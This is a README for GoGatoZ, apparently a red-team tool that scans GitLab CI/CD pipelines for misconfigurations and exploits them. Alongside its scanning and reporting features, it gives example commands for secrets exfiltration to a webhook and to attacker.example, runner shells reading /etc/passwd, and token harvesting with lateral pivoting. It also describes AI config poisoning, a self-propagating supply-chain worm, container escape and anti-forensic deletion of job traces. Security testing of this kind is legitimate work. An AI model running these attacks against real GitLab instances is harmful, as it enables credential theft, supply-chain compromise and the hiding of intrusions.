# GoGatoZ

**GitLab CI/CD security scanner and attack toolkit** -- the Go port of [Gato-X](https://github.com/AdnaneKhan/Gato-X), adapted for GitLab.

GoGatoZ discovers GitLab projects, scans their CI/CD configurations for security vulnerabilities, exploits misconfigurations, and maps attack paths with BloodHound-CE integration.

<!-- badges -->

## Features

- **Search** -- discover GitLab projects by name, language, topic, code content, or file path patterns
- **Enumerate** -- scan `.gitlab-ci.yml` pipelines for 37 finding types across includes, runners, secrets, injection, supply chain, and LOTP vectors
- **Attack** -- 15+ exploitation modules: CI injection, secrets exfiltration, deploy keys, runner-on-runner, AI poisoning, supply chain attacks, and more
- **Pivot** -- automated BFS lateral movement: enumerate, attack, harvest tokens, validate, and repeat at depth
- **SecretScan** -- clone and scan repos for leaked secrets via TruffleHog, Gitleaks, or Titus
- **BloodHound** -- export CI/CD attack surface graphs to BloodHound-CE with 10 pre-built Cypher attack path queries
- **Report** -- generate HTML, SARIF, GitLab SAST, JSON, JSONL, or text reports with interactive charts
- **Notify** -- send findings to Discord, Apprise, or raw webhooks
- **PBOM** -- Pipeline Bill of Materials in native JSON or CycloneDX 1.5 format
- **MCP** -- Model Context Protocol server for AI-assisted scanning via Claude Code
- **API Server** -- REST/NDJSON HTTP interface for tooling integration
- **Compliance scoring** -- A-E letter grades with false positive filtering
- **SOCKS5 proxy** -- route all traffic through SOCKS5 proxies (with optional auth)
- **Rate limiting** -- token-bucket rate limiter with adaptive jittered backoff for 429/5xx
- **SQLite persistence** -- automatic result storage for querying across sessions

## Installation

### go install

```bash
go install github.com/mr-pmillz/gogatoz@latest
```

### Docker (GHCR)

```bash
docker pull ghcr.io/mr-pmillz/gogatoz:latest
docker run --rm -e GITLAB_TOKEN=glpat-xxx ghcr.io/mr-pmillz/gogatoz:latest --help
```

Multi-arch images (amd64/arm64) are tagged with the version (`v1.2.3`) and `latest`.

### Prebuilt Binaries

Download from the [GitHub Releases page](https://github.com/mr-pmillz/gogatoz/releases).

## Quick Start

```bash
# 1. Export your GitLab token (api + read_repository scopes; write_repository for attack)
export GITLAB_TOKEN=glpat-xxx

# 2. Search for projects
gogatoz search -q "deploy" --per-page 20 --max-pages 1

# 3. Enumerate CI/CD risks
gogatoz enumerate --input targets.txt --concurrency 16 --json

# 4. Generate an HTML report
gogatoz report --input results.jsonl --output report.html

# Pipeline: search -> enumerate -> report
gogatoz search -q "runner" --format jsonl \
  | gogatoz enumerate --input - --format jsonl \
  | gogatoz report --input /dev/stdin --output report.html
```

For self-hosted GitLab instances, set `--gitlab-url` or `export GITLAB_URL=https://gitlab.internal`. Use `--insecure-skip-tls-verify` or `--ca-cert /path/to/ca.pem` for custom TLS.

## Commands

### search

Discover GitLab projects via the API with rich filtering.

```bash
# Basic search
gogatoz search -q "runner" --per-page 50 --max-pages 0

# Filter by language + topic
gogatoz search -q "ci" --language go,python --topic security,devops --format jsonl

# Filter by code content
gogatoz search -q "runner" --code-content "tags: self-hosted" --code-per-page 10

# Filter by file path pattern
gogatoz search -q "deploy" --path-pattern "ci/**/deploy?.yml" --path-ref main

# Membership/ownership filters
gogatoz search -q "infra" --membership --visibility private
```

Key flags: `--query`, `--language`, `--topic`, `--code-content`, `--path-pattern`, `--path-exists`, `--visibility`, `--membership`, `--owned`, `--archived-only`, `--format`, `--output`. Set `--max-pages 0` to fetch all pages.

### enumerate

Scan projects for CI/CD configuration vulnerabilities. Detects 37 finding types including include risks, runner exposure, MR-triggered jobs, variable injection, artifact poisoning, plaintext secrets, fork risks, script injection, LOTP tool execution, OIDC token exposure, cache poisoning, and more.

```bash
# Scan from file
gogatoz enumerate --input targets.txt --concurrency 16 --timeout 20s --json

# Deep include resolution
gogatoz enumerate --input targets.txt --deep --follow-includes --include-depth 5

# Expand groups into projects
gogatoz enumerate --group myorg/platform --group-recursive --format jsonl

# With runners and protected branch info
gogatoz enumerate --input targets.txt --runners --protected-branches --score

# Output as SARIF + HTML
gogatoz enumerate --input targets.txt --format html --output report.html --sarif-output scan.sarif

# Pipe from search
gogatoz search -q "runner" --format jsonl | gogatoz enumerate --input - --only-findings --json
```

Key flags: `--input`, `--group`, `--groups`, `--concurrency`, `--timeout`, `--follow-includes`, `--include-depth`, `--deep`, `--runners`, `--runners-scope`, `--protected-branches`, `--score`, `--filter-false-positives`, `--only-findings`, `--redacted`, `--log-scrape`, `--format`, `--sarif-output`, `--glsast-output`, `--bloodhound-export`, `--webhook-url`.

### attack

Exploit CI/CD misconfigurations with 15+ attack modules.

**CI Pipeline Injection:**

```bash
# Commit CI from file
gogatoz attack -t group/project --commit-ci --ci-file payload.yml --branch exfil-branch

# Commit a built-in payload template
gogatoz attack -t group/project --commit-ci --payload secrets --webhook https://hook.site/xxx

# Render payload locally without committing
gogatoz attack --payload-only --payload ror-shell --tags self-hosted --cmd 'id; uname -a'
```

**Secrets Exfiltration:**

```bash
# Via CI job with RSA encryption
gogatoz attack -t group/project --secrets --branch exfil --pubkey-file key.pem

# Dump project/group variables via API
gogatoz attack -t group/project --secrets --project-vars --group-vars --group-id myorg --json
```

**Runner-on-Runner (RoR):**

```bash
gogatoz attack -t group/project --commit-ci --payload ror-shell \
  --tags self-hosted,linux --cmd 'whoami; cat /etc/passwd'
```

**Additional Modes:**

| Flag | Description |
|------|-------------|
| `--deploy-key` | Create a deploy key with write access |
| `--add-member` | Add a user as project member |
| `--ai-inject` | Poison AI config files (CLAUDE.md, .cursorrules, etc.) |
| `--inject-script` | Modify repo scripts called by CI (workflow hopping) |
| `--auto-merge` | Create MR, self-approve, and merge (supply chain) |
| `--harvest` | Install git hooks on runner, harvest tokens via callbacks |
| `--tamper-release` | Modify GitLab release metadata and asset links |
| `--tamper-package` | Upload malicious packages to the Generic Packages registry |
| `--tamper-tag` | Poison a git tag by replacing files (Trivy-style) |
| `--lotp-inject` | Living off the Pipeline tool config injection |
| `--variable-inject` | Inject malicious CI variables |
| `--memory-dump` | Dump secrets from runner process memory |
| `--container-escape` | Escape privileged Docker executor to host |
| `--supply-chain-worm` | Self-propagating CI injection across sibling repos |
| `--discover-tags` | Discover runner tags for a project |
| `--cleanup` | Remove attack artifacts (branches, CI files, keys, members) |
| `--cleanup-pipeline` | Delete a pipeline by ID (anti-forensics) |
| `--cleanup-jobs` | Erase job traces on recent pipelines |

Payload types for `--payload`: `ror-shell`, `pwn-request`, `ror`, `runner-on-runner`, `secrets`, `secrets-exfil`, `git-hook`, `cache-poison`.

Branch deconflict strategies (`--deconflict`): `fail` (default), `suffix`, `force`.

### pivot

Automated lateral movement via CI/CD secrets exfiltration in a BFS loop.

```bash
gogatoz pivot \
  -t group/project \
  --external-url https://attacker.example:9443 \
  --max-depth 3 \
  --max-targets 50

# Dry run (enumerate only)
gogatoz pivot -t group/project --external-url https://attacker.example:9443 --dry-run
```

Workflow: enumerate targets -> filter exploitable findings -> attack with secrets exfil via HTTP callback -> decrypt harvested data (RSA+AES) -> extract GitLab tokens -> validate -> repeat with new credentials at the next depth level.

Key flags: `--external-url`, `--max-depth`, `--max-targets`, `--max-credentials`, `--listen`, `--cleanup`, `--dry-run`, `--group`, `--rsa-key`, `--concurrency`.

### secretscan

Clone GitLab projects and scan for leaked secrets using external tools.

```bash
# Auto-detect scanners and scan
gogatoz secretscan --query "infra" --output-dir ./repos --concurrency 8

# Specific scanners
gogatoz secretscan --query "deploy" -o ./repos --scanners trufflehog,gitleaks

# Scan pre-cloned repos
gogatoz secretscan --scan-dir ./existing-repos --redact

# Unauthenticated scan of public projects
gogatoz secretscan --query "ci" -o ./repos --no-token --visibility public
```

Supported scanners (must be on PATH): TruffleHog, Gitleaks, Titus. Use `--scanners auto` (default) to detect all available.

### bloodhound

BloodHound-CE integration for visualizing CI/CD attack surfaces as dependency pwnage matrices. Models projects, jobs, runners, findings, and their relationships as a graph, enabling Cypher-based attack path discovery.

```bash
# Export to OpenGraph ZIP
gogatoz bloodhound export --session 1 --output attack-surface.zip

# Export from JSONL file
gogatoz bloodhound export --input results.jsonl --output attack-surface.zip

# Upload schema to BloodHound-CE
gogatoz bloodhound schema

# Upload scan data
gogatoz bloodhound upload --session 1

# Install 10 pre-built Cypher attack path queries
gogatoz bloodhound queries
```

**10 pre-built Cypher queries**: All Exploitable Findings, Dependency Pwnage Matrix (transitive chains), Cross-Project Include Map, Runner Blast Radius, Shared Runner Attack Surface, Downstream Trigger Chains, Remote Include Risk Map, Full Attack Surface Graph, Pivot Attack Chains, Secret and Credential Exposure.

**Graph schema**: 10 node kinds (GitLab Instance, Group, Project, Runner, CI Config, Job, Finding, Secret, Pipeline, Credential) and 15 edge kinds including traversable attack edges (`CICD_DependsOn`, `CICD_IncludesProject`, `CICD_RunsOn`, `CICD_SharedRunner`, `CICD_PivotsTo`, etc.)

Also integrates with the `enumerate` command via `--bloodhound-export <path.zip>` for single-step scan-to-graph workflows.

### report

Generate reports from scan results.

```bash
# HTML report with charts and searchable tables
gogatoz report --input results.jsonl --output report.html

# From SQLite database
gogatoz report --db results.sqlite3 --session 1 --output report.html

# SARIF report
gogatoz report --input results.jsonl --format sarif --output scan.sarif

# GitLab SAST format
gogatoz report --input results.jsonl --format glsast --output gl-sast-report.json

# Text summary
gogatoz report --input results.jsonl --format text --only-findings

# With false positive filtering
gogatoz report --input results.jsonl --filter-false-positives --output report.html
```

Supported formats: `html`, `text`, `json`, `jsonl`, `sarif`, `glsast`.

### notify

Send findings to external notification systems.

```bash
# Discord via Apprise
gogatoz notify --input results.jsonl --apprise-url https://apprise.example/notify/apprise

# Direct Discord webhook
gogatoz notify --input results.jsonl --discord-webhook https://discord.com/api/webhooks/...

# Dry run
gogatoz notify --input results.jsonl --discord-webhook https://example.com --dry-run

# From database
gogatoz notify --db results.sqlite3 --session 1 --apprise-url https://apprise.example/notify/apprise

# Piped from enumerate
gogatoz enumerate -i targets.txt --json | gogatoz notify --discord-webhook https://discord.com/api/webhooks/...
```

### explain

Look up finding codes and remediation guidance.

```bash
# Explain a specific finding
gogatoz explain SCRIPT_INJECTION_RISK

# List all 37 finding codes
gogatoz explain --list

# Full reference dump
gogatoz explain --all --json
```

### pbom

Generate a Pipeline Bill of Materials inventorying all container images and CI include references.

```bash
# Native PBOM JSON
gogatoz pbom --project group/project --output pbom.json

# CycloneDX 1.5 SBOM
gogatoz pbom --project group/project --format cyclonedx --output sbom.json

# Specific ref with include resolution
gogatoz pbom --project group/project --ref v2.0.0 --follow-includes --include-depth 5
```

### query

Query the local SQLite database for stored scan results, findings, and attack data.

```bash
gogatoz query sessions                      # List scan sessions
gogatoz query projects                      # List scanned projects
gogatoz query findings --session 1          # Show findings for a session
gogatoz query attacks                       # Show attack results
gogatoz query secrets                       # Show exfiltrated secrets
gogatoz query credentials                   # Show harvested credentials (pivot)
gogatoz query exfil                         # Show RoR listener callbacks
gogatoz query sessions --format json        # JSON output
```

### parse

Transform and deduplicate GoGatoZ output locally (no GitLab token required).

```bash
# Dedup search results before enumerate
gogatoz search -q "vuln" --format jsonl | gogatoz parse dedup | gogatoz enumerate --input -

# Dedup a file
gogatoz parse dedup --input all-search.jsonl --output targets.jsonl
```

### api-server

Start an HTTP server exposing enumeration, search, and auth endpoints via JSON/NDJSON.

```bash
gogatoz api-server --listen :8088 --base-url https://gitlab.com
```

### mcp

Start a Model Context Protocol server over stdio for integration with Claude Code or other MCP-compatible clients.

```bash
gogatoz mcp --db results.sqlite3
```

Example `.mcp.json` for Claude Code:

```json
{
  "mcpServers": {
    "gogatoz": {
      "command": "gogatoz",
      "args": ["mcp", "--db", "results.sqlite3"],
      "env": {
        "GITLAB_TOKEN": "glpat-xxx",
        "GITLAB_URL": "https://gitlab.com"
      }
    }
  }
}
```

Exposes `search_projects` and `enumerate_projects` tools over stdio.

## Output Formats

| Format | Flag | Description |
|--------|------|-------------|
| Text | `--format text` | Human-readable styled tables (default) |
| JSON | `--format json` or `--json` | Single JSON object/array |
| JSONL | `--format jsonl` | Newline-delimited JSON (streamable) |
| HTML | `--format html` | Self-contained report with Chart.js and DataTables |
| SARIF | `--format sarif` or `--sarif-output` | SARIF 2.1.0 for IDE/CI integration |
| GitLab SAST | `--format glsast` or `--glsast-output` | GitLab Security Dashboard format |

## Configuration

### Precedence

CLI flags > environment variables > config file > built-in defaults.

### Config File

Pass `--config` or set `GOGATOZ_CONFIG`. Falls back to `./.gogatoz.yaml` if present. Generate a default config with `gogatoz config init`.

```yaml
gitlab-url: https://gitlab.com
json: true
rate-rps: 8
rate-burst: 16
retry-max: 3
concurrency: 16
timeout: 20s
follow-includes: true
include-depth: 3
```

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `GITLAB_TOKEN` | GitLab PAT (scopes: `api`, `read_repository`; `write_repository` for attack) | -- |
| `GITLAB_URL` | GitLab instance URL | `https://gitlab.com` |
| `GOGATOZ_CONFIG` | Config file path | -- |
| `GOGATOZ_DB` | SQLite database path | `~/.local/share/gogatoz/results.db` |
| `GOGATOZ_RATE_RPS` | Max requests/sec | `8` |
| `GOGATOZ_RATE_BURST` | Burst size | `16` |
| `GOGATOZ_RETRY_MAX` | Max retries on 429/5xx | `3` |
| `GOGATOZ_INSECURE` | Skip TLS verification | -- |
| `GOGATOZ_CA_CERT` | Additional CA certificate path | -- |
| `GOGATOZ_USER_AGENT` | Custom User-Agent | -- |
| `GOGATOZ_SOCKS5_PROXY` | SOCKS5 proxy address (`host:port`) | -- |
| `GOGATOZ_SOCKS5_USER` | SOCKS5 proxy username | -- |
| `GOGATOZ_SOCKS5_PASS` | SOCKS5 proxy password | -- |
| `GOGATOZ_BH_URL` | BloodHound-CE instance URL | -- |
| `GOGATOZ_BH_TOKEN_ID` | BloodHound-CE API token ID | -- |
| `GOGATOZ_BH_TOKEN_KEY` | BloodHound-CE API token key | -- |
| `APPRISE_URL` | Apprise API URL for notify | -- |
| `DISCORD_WEBHOOK` | Discord webhook URL for notify | -- |
| `GOGATOZ_HTTP_MAX_IDLE` | HTTP MaxIdleConns | -- |
| `GOGATOZ_HTTP_MAX_IDLE_PER_HOST` | HTTP MaxIdleConnsPerHost | -- |
| `GOGATOZ_HTTP_IDLE_TIMEOUT` | HTTP IdleConnTimeout | -- |
| `GOGATOZ_HTTP_TLS_TIMEOUT` | HTTP TLSHandshakeTimeout | -- |
| `GOGATOZ_HTTP_EXPECT_TIMEOUT` | HTTP ExpectContinueTimeout | -- |
| `GOGATOZ_HTTP_REQ_TIMEOUT` | HTTP overall request timeout | -- |

## SOCKS5 Proxy Support

Route all GitLab API traffic through a SOCKS5 proxy:

```bash
# No authentication
gogatoz search -q "ci" --socks5-proxy proxy.internal:1080

# With authentication
gogatoz enumerate --input targets.txt \
  --socks5-proxy proxy.internal:1081 \
  --socks5-user proxyuser \
  --socks5-pass proxypass

# Via environment variables
export GOGATOZ_SOCKS5_PROXY=proxy.internal:1080
gogatoz enumerate --input targets.txt
```

## Documentation

Full documentation is available at the [GoGatoZ docs site](https://mr-pmillz.github.io/gogatoz/).

## License

GoGatoZ is licensed under the Apache License, Version 2.0. The original Gato-X project is (c) 2024 Adnan Khan.
